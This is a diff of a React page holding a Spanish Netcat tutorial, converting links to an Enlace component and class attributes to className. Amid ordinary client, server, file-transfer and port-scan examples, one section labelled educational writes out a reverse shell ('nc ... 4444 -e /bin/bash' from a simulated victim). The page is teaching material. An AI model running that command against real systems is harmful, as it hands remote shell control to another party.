@@ -2,6 +2,14 @@ import Titulo from "./../../componentes/titulo.jsx";
 import Lista from "./../../componentes/lista.jsx";
 import Texto from "./../../componentes/texto.jsx";
 import Linea from "./../../componentes/linea.jsx";
+import Enlace from "../../../componentes/enlace.jsx";
+
+function Temario({ className = "" }) {
+  return (
+    <Lista className={className}>
+   </Lista>
+  );
+}
 
 function nameabcd({ }) {
   return (
@@ -10,51 +18,51 @@ function nameabcd({ }) {
       <Linea />
       <Titulo title="h2" id="temario">Temario</Titulo>
       <Lista>
-        <li><a href="#netcat-en-linux">Netcat en Linux</a>
+        <li><Enlace href="#netcat-en-linux">Netcat en Linux</Enlace >
           <Lista>
-            <li><a href="#temario">Temario</a></li>
-            <li><a href="#qué-es-netcat">¿Qué es Netcat?</a></li>
-            <li><a href="#instalación">Instalación</a></li>
-            <li><a href="#sintaxis-general">Sintaxis general</a></li>
-            <li><a href="#modos-principales-de-uso">Modos principales de uso</a>
+            <li><Enlace href="#temario">Temario</Enlace ></li>
+            <li><Enlace href="#qué-es-netcat">¿Qué es Netcat?</Enlace ></li>
+            <li><Enlace href="#instalación">Instalación</Enlace ></li>
+            <li><Enlace href="#sintaxis-general">Sintaxis general</Enlace ></li>
+            <li><Enlace href="#modos-principales-de-uso">Modos principales de uso</Enlace >
               <Lista>
-                <li><a href="#cliente-tcp">Cliente TCP</a></li>
-                <li><a href="#servidor-tcp">Servidor TCP</a></li>
+                <li><Enlace href="#cliente-tcp">Cliente TCP</Enlace ></li>
+                <li><Enlace href="#servidor-tcp">Servidor TCP</Enlace ></li>
               </Lista>
             </li>
-            <li><a href="#udp-en-lugar-de-tcp">UDP en lugar de TCP</a></li>
-            <li><a href="#transferencia-de-archivos">Transferencia de archivos</a>
+            <li><Enlace href="#udp-en-lugar-de-tcp">UDP en lugar de TCP</Enlace ></li>
+            <li><Enlace href="#transferencia-de-archivos">Transferencia de archivos</Enlace >
               <Lista>
-                <li><a href="#enviar-un-archivo">Enviar un archivo</a></li>
+                <li><Enlace href="#enviar-un-archivo">Enviar un archivo</Enlace ></li>
               </Lista>
             </li>
-            <li><a href="#chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
-              (TCP)</a></li>
-            <li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li>
-            <li><a href="#redirección-de-entradasalida">Redirección de
-              entrada/salida</a></li>
-            <li><a href="#reverse-shells-usos-éticos-y-educativos">Reverse Shells
-              (usos éticos y educativos)</a>
+            <li><Enlace href="#chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
+              (TCP)</Enlace ></li>
+            <li><Enlace href="#escaneo-de-puertos">Escaneo de puertos</Enlace ></li>
+            <li><Enlace href="#redirección-de-entradasalida">Redirección de
+              entrada/salida</Enlace ></li>
+            <li><Enlace href="#reverse-shells-usos-éticos-y-educativos">Reverse Shells
+              (usos éticos y educativos)</Enlace >
               <Lista>
-                <li><a href="#en-el-servidor-escuchando">En el servidor
-                  (escuchando)</a></li>
-                <li><a href="#en-la-víctima-simulada">En la víctima (simulada)</a></li>
+                <li><Enlace href="#en-el-servidor-escuchando">En el servidor
+                  (escuchando)</Enlace ></li>
+                <li><Enlace href="#en-la-víctima-simulada">En la víctima (simulada)</Enlace ></li>
               </Lista>
             </li>
-            <li><a href="#otras-opciones-útiles">Otras opciones útiles</a></li>
-            <li><a href="#ejemplo-práctico-completo">Ejemplo práctico completo</a>
+            <li><Enlace href="#otras-opciones-útiles">Otras opciones útiles</Enlace ></li>
+            <li><Enlace href="#ejemplo-práctico-completo">Ejemplo práctico completo</Enlace >
               <Lista>
-                <li><a href="#crear-servidor-de-eco">Crear servidor de eco</a></li>
-                <li><a href="#cliente">Cliente</a></li>
+                <li><Enlace href="#crear-servidor-de-eco">Crear servidor de eco</Enlace ></li>
+                <li><Enlace href="#cliente">Cliente</Enlace ></li>
               </Lista>
             </li>
-            <li><a href="#resumen-rápido">Resumen rápido</a></li>
-            <li><a href="#alternativas-modernas">Alternativas modernas</a></li>
+            <li><Enlace href="#resumen-rápido">Resumen rápido</Enlace ></li>
+            <li><Enlace href="#alternativas-modernas">Alternativas modernas</Enlace ></li>
           </Lista>
         </li>
       </Lista>
-      <Texto><a href="./../../readme.md#5-python">Regresar a la Guía
-        Principal</a></Texto>
+      <Texto><Enlace href="./../../readme.md#5-python">Regresar a la Guía
+        Principal</Enlace ></Texto>
       <Linea />
       <Titulo title="h2" id="qué-es-netcat">¿Qué es Netcat?</Titulo>
       <Texto><strong>Netcat</strong> (abreviado <code>nc</code>) es una
@@ -72,94 +80,94 @@ function nameabcd({ }) {
       <Linea />
       <Titulo title="h2" id="instalación">Instalación</Titulo>
       <Texto>En la mayoría de sistemas viene preinstalado:</Texto>
-      <div class="sourceCode" id="cb1">
+      <div className="sourceCode" id="cb1">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-h</span></span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb1-1"><Enlace href="#cb1-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-h</span></span></code></pre>
       </div>
       <Texto>Si no lo tienes:</Texto>
       <Texto><strong>Linux (Debian/Ubuntu):</strong></Texto>
-      <div class="sourceCode" id="cb2">
+      <div className="sourceCode" id="cb2">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install netcat</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb2-1"><Enlace href="#cb2-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="fu">sudo</span> apt install netcat</span></code></pre>
       </div>
       <Texto><strong>Windows:</strong> Puedes usar <strong>Ncat</strong> (parte de
-        Nmap): 👉 <a href="https://nmap.org/ncat/">https://nmap.org/ncat/</a></Texto>
+        Nmap): 👉 <Enlace href="https://nmap.org/ncat/">https://nmap.org/ncat/</Enlace ></Texto>
       <Linea />
       <Titulo title="h2" id="sintaxis-general">Sintaxis general</Titulo>
-      <div class="sourceCode" id="cb3">
+      <div className="sourceCode" id="cb3">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="pp">[</span><span class="ss">opciones</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">host</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">puerto</span><span class="pp">]</span></span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb3-1"><Enlace href="#cb3-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="pp">[</span><span className="ss">opciones</span><span className="pp">]</span> <span className="pp">[</span><span className="ss">host</span><span className="pp">]</span> <span className="pp">[</span><span className="ss">puerto</span><span className="pp">]</span></span></code></pre>
       </div>
       <Linea />
       <Titulo title="h2" id="modos-principales-de-uso">Modos principales de uso</Titulo>
       <Titulo title="h3" id="cliente-tcp">Cliente TCP</Titulo>
       <Texto>Conectarse a un servidor:</Texto>
-      <div class="sourceCode" id="cb4">
+      <div className="sourceCode" id="cb4">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 8080</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb4-1"><Enlace href="#cb4-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 8080</span></code></pre>
       </div>
       <Texto>Esto abre una conexión al puerto 8080 del localhost.</Texto>
       <Titulo title="h3" id="servidor-tcp">Servidor TCP</Titulo>
       <Texto>Escuchar conexiones:</Texto>
-      <div class="sourceCode" id="cb5">
+      <div className="sourceCode" id="cb5">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 8080</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb5-1"><Enlace href="#cb5-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 8080</span></code></pre>
       </div>
       <Texto>🔹 <code>-l</code> → modo escucha</Texto>
       <Texto>🔹 <code>-p</code> → especifica el puerto</Texto>
       <Texto>Luego, desde otro terminal:</Texto>
-      <div class="sourceCode" id="cb6">
+      <div className="sourceCode" id="cb6">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 8080</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb6-1"><Enlace href="#cb6-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 8080</span></code></pre>
       </div>
       <Texto>Ahora puedes <strong>enviar mensajes entre ambos terminales (chat
         simple)</strong>.</Texto>
       <Linea />
       <Titulo title="h2" id="udp-en-lugar-de-tcp">UDP en lugar de TCP</Titulo>
       <Texto>Para usar <strong>UDP</strong> en vez de TCP:</Texto>
-      <div class="sourceCode" id="cb7">
+      <div className="sourceCode" id="cb7">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Servidor</span></span>
-            <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-u</span> <span class="at">-l</span> <span class="at">-p</span> 6000</span>
-            <span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
-            <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Cliente</span></span>
-            <span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-u</span> 127.0.0.1 6000</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb7-1"><Enlace href="#cb7-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="co"># Servidor</span></span>
+            <span id="cb7-2"><Enlace href="#cb7-2" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-u</span> <span className="at">-l</span> <span className="at">-p</span> 6000</span>
+            <span id="cb7-3"><Enlace href="#cb7-3" aria-hidden="true" tabindex="-1"></Enlace ></span>
+            <span id="cb7-4"><Enlace href="#cb7-4" aria-hidden="true" tabindex="-1"></Enlace ><span className="co"># Cliente</span></span>
+            <span id="cb7-5"><Enlace href="#cb7-5" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-u</span> 127.0.0.1 6000</span></code></pre>
       </div>
       <Texto>🔹 <code>-u</code> → activa modo UDP.</Texto>
       <Linea />
       <Titulo title="h2" id="transferencia-de-archivos">Transferencia de archivos</Titulo>
       <Titulo title="h3" id="enviar-un-archivo">Enviar un archivo</Titulo>
       <Texto>Servidor que recibirá:</Texto>
-      <div class="sourceCode" id="cb8">
+      <div className="sourceCode" id="cb8">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 5000 <span class="op">&gt;</span> archivo_recibido.txt</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb8-1"><Enlace href="#cb8-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 5000 <span className="op">&gt;</span> archivo_recibido.txt</span></code></pre>
       </div>
       <Texto>Cliente que envía:</Texto>
-      <div class="sourceCode" id="cb9">
+      <div className="sourceCode" id="cb9">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 5000 <span class="op">&lt;</span> archivo.txt</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb9-1"><Enlace href="#cb9-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 5000 <span className="op">&lt;</span> archivo.txt</span></code></pre>
       </div>
       <Texto>👉 El archivo <code>archivo.txt</code> se envía al servidor.</Texto>
       <Linea />
       <Titulo title="h2" id="chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
         (TCP)</Titulo>
       <Texto>En una máquina:</Texto>
-      <div class="sourceCode" id="cb10">
+      <div className="sourceCode" id="cb10">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 4000</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb10-1"><Enlace href="#cb10-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 4000</span></code></pre>
       </div>
       <Texto>En otra:</Texto>
-      <div class="sourceCode" id="cb11">
+      <div className="sourceCode" id="cb11">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> IP_DEL_SERVIDOR 4000</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb11-1"><Enlace href="#cb11-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> IP_DEL_SERVIDOR 4000</span></code></pre>
       </div>
       <Texto>Ahora ambos pueden escribir y leer mensajes.</Texto>
       <Linea />
       <Titulo title="h2" id="escaneo-de-puertos">Escaneo de puertos</Titulo>
       <Texto>Netcat puede escanear qué puertos están abiertos en una máquina:</Texto>
-      <div class="sourceCode" id="cb12">
+      <div className="sourceCode" id="cb12">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-zv</span> 192.168.1.10 20-80</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb12-1"><Enlace href="#cb12-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-zv</span> 192.168.1.10 20-80</span></code></pre>
       </div>
       <Texto>🔹 <code>-z</code> → modo “scan” sin enviar datos.</Texto>
       <Texto>🔹 <code>-v</code> → modo verbose (muestra resultado).</Texto>
@@ -167,14 +175,14 @@ function nameabcd({ }) {
       <Linea />
       <Titulo title="h2" id="redirección-de-entradasalida">Redirección de entrada/salida</Titulo>
       <Texto>Puedes usar <strong>pipes</strong> para automatizar tareas:</Texto>
-      <div class="sourceCode" id="cb13">
+      <div className="sourceCode" id="cb13">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;Hola servidor&quot;</span> <span class="kw">|</span> <span class="ex">nc</span> 127.0.0.1 8080</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb13-1"><Enlace href="#cb13-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="bu">echo</span> <span className="st">&quot;Hola servidor&quot;</span> <span className="kw">|</span> <span className="ex">nc</span> 127.0.0.1 8080</span></code></pre>
       </div>
       <Texto>O guardar la respuesta:</Texto>
-      <div class="sourceCode" id="cb14">
+      <div className="sourceCode" id="cb14">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 80 <span class="op">&lt;</span> peticion.txt <span class="op">&gt;</span> respuesta.txt</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb14-1"><Enlace href="#cb14-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 80 <span className="op">&lt;</span> peticion.txt <span className="op">&gt;</span> respuesta.txt</span></code></pre>
       </div>
       <Linea />
       <Titulo title="h2" id="reverse-shells-usos-éticos-y-educativos">Reverse Shells (usos
@@ -183,14 +191,14 @@ function nameabcd({ }) {
         inversa</strong>, usadas en <strong>pentesting</strong> (no
         ilegalmente).</Texto>
       <Titulo title="h3" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
-      <div class="sourceCode" id="cb15">
+      <div className="sourceCode" id="cb15">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 4444 <span class="at">-v</span></span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb15-1"><Enlace href="#cb15-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 4444 <span className="at">-v</span></span></code></pre>
       </div>
       <Titulo title="h3" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
-      <div class="sourceCode" id="cb16">
+      <div className="sourceCode" id="cb16">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 192.168.1.100 4444 <span class="at">-e</span> /bin/bash</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb16-1"><Enlace href="#cb16-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 192.168.1.100 4444 <span className="at">-e</span> /bin/bash</span></code></pre>
       </div>
       <Texto>👉 Esto le da al servidor una consola remota de la otra máquina.
         <em>(Solo en entornos controlados o de práctica legal.)</em>
@@ -238,15 +246,15 @@ function nameabcd({ }) {
       <Linea />
       <Titulo title="h2" id="ejemplo-práctico-completo">Ejemplo práctico completo</Titulo>
       <Titulo title="h3" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
-      <div class="sourceCode" id="cb17">
+      <div className="sourceCode" id="cb17">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Servidor</span></span>
-            <span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-l</span> <span class="at">-p</span> 1234 <span class="at">-v</span></span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb17-1"><Enlace href="#cb17-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="co"># Servidor</span></span>
+            <span id="cb17-2"><Enlace href="#cb17-2" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 1234 <span className="at">-v</span></span></code></pre>
       </div>
       <Titulo title="h3" id="cliente">Cliente</Titulo>
-      <div class="sourceCode" id="cb18">
+      <div className="sourceCode" id="cb18">
         <pre
-          class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> 127.0.0.1 1234</span></code></pre>
+          className="sourceCode bash"><code className="sourceCode bash"><span id="cb18-1"><Enlace href="#cb18-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 1234</span></code></pre>
       </div>
       <Texto>Ahora cualquier texto que envíes se reflejará entre ambos.</Texto>
       <Linea />
@@ -308,8 +316,8 @@ function nameabcd({ }) {
           sistemas modernos.</li>
       </Lista>
       <Linea />
-      <Texto><a href="./../../readme.md#5-python">Regresar a la Guía
-        Principal</a></Texto>
+      <Texto><Enlace href="./../../readme.md#5-python">Regresar a la Guía
+        Principal</Enlace ></Texto>
       <blockquote>
         <Texto><strong>Autor:</strong> Fravelz</Texto>
       </blockquote>
